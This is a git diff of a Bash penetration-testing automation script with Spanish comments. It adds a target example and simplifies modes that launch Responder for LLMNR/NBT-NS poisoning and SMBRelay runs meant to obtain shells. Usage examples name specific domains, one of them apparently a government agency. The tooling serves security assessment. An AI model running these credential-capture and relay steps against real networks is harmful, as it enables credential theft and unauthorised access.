@@ -43,6 +43,8 @@ Ejemplo 1: Escanear el listado de subredes (completo)
 	discover.sh -t internet -d agetic.gob.bo -k agetic 
 	discover.sh -t oscp -i ips.txt 
 	discover.sh -t proxy -i ips.txt 
+	discover.sh -t lan -d diaconia.local -k diaconia -s redes2.txt 
+	
 	
 EOF
 
@@ -74,23 +76,7 @@ if [ $TYPE == "internet" ]; then
 	cracker.sh -e $KEYWORD
 fi
 
-if [ $TYPE == "oscp" ]; then 	
-	#cd EXTERNO
-	echo -e "[+] Lanzando monitor $RESET" 
-	if [ $SUBNET_FILE != NULL ] ; then
-		sub=`cat $SUBNET_FILE| head -1`
-		num_targets='prips $sub | wc -l'
-		echo "num_targets $num_targets"
-		xterm -hold -e monitor.sh $num_targets 2>/dev/null&
-	fi
-
-	if [ $IP_LIST_FILE != NULL ] ; then
-		num_targets=$((`wc -l $IP_LIST_FILE | awk '{print $1}'`*2))		 
-		echo "num_targets $num_targets"
-		xterm -hold -e monitor.sh $num_targets 2>/dev/null&
-	fi
-	
-	
+if [ $TYPE == "oscp" ]; then 		
 	lanscanner.sh -m extended -i $IP_LIST_FILE -s $SUBNET_FILE
 	directory=`ls -hlt | grep '^d' | head -1 | awk '{print $9}'`
 	echo "entrando al directorio $directory" # creado por lanscanner
@@ -149,7 +135,7 @@ if [ $TYPE == "lan" ]; then
 	#rm /usr/bin/pentest/Responder/logs/* 2>/dev/null
 	/etc/init.d/smbd stop 
 	cp /usr/bin/pentest/Responder/Responder.conf.normal /usr/bin/pentest/Responder/Responder.conf
-	xterm -hold -e responder.sh -F -f -I $iface 2>/dev/null& 	
+	xterm -hold -e responder.sh -F -I $iface 2>/dev/null&
 	
 		
 	if [ "$SUBNET_FILE" != NULL ]; then 	
@@ -178,18 +164,7 @@ if [ $TYPE == "lan" ]; then
 	echo -e "\t[+] Testeando SMBRelay (shell - 32 bits)"
 	killall xterm
 	pwd
-	smbrelay.sh -t shell32bits &
-	sleep 600	
-	# Matar responder, puede causar problemas de red
-	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
-	kill -9 `ps aux | grep -i ntlmrelayx.py| head -1 | awk '{print $2}'`
-	kill -9 `ps aux | grep -i configweb.sh| head -1 | awk '{print $2}'`
-	sleep 10
-
-	########  SMBRelay 64 bits #########
-	echo -e "\t[+] Testeando SMBRelay (shell - 64 bits)"	
-	pwd
-	smbrelay.sh -t shell64bits &
+	smbrelay.sh -t shell &
 	sleep 600	
 	# Matar responder, puede causar problemas de red
 	kill -9 `ps aux | grep -i responder.sh| head -1 | awk '{print $2}'`
